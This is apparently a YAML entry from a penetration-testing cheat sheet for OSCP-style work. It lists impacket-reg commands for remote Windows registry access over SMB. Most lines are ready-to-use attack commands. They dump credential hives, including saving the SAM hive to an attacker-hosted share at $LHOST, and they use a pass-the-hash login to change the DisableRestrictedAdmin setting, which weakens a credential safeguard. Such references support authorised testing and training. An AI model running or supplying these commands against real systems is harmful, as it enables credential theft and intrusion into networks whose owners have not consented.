---
variants:
  - label: query
    command: |
      impacket-reg $DOMAIN/$USER:$PASSWORD@$IP query -keyName 'HKLM\SOFTWARE' -s
  - label: backup-hives
    command: |
      impacket-reg $DOMAIN/$USER:$PASSWORD@$IP backup -o 'C:\Windows\Temp'
  - label: save-hive
    command: |
      impacket-reg $DOMAIN/$USER:$PASSWORD@$IP save -keyName 'HKLM\SAM' -o "\\\\$LHOST\\share"
  - label: add-key
    command: |
      impacket-reg $DOMAIN/$USER:$PASSWORD@$IP add -keyName 'HKLM\SOFTWARE\Test' -v 'Flag' -vt 'REG_SZ' -vd 'value'
  - label: hash
    command: |
      impacket-reg -hashes :$HASH $DOMAIN/$USER@$IP add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
description: Read and write the remote registry over SMB to query keys or dump SAM, SYSTEM, and SECURITY hives
os: [Linux]
category: [oscp, cli]
have: [hash]
service: [RPC, SMB]
phase: [CredAccess, Enumeration]
references:
  - https://www.kali.org/tools/impacket-scripts/
  - https://github.com/fortra/impacket
---
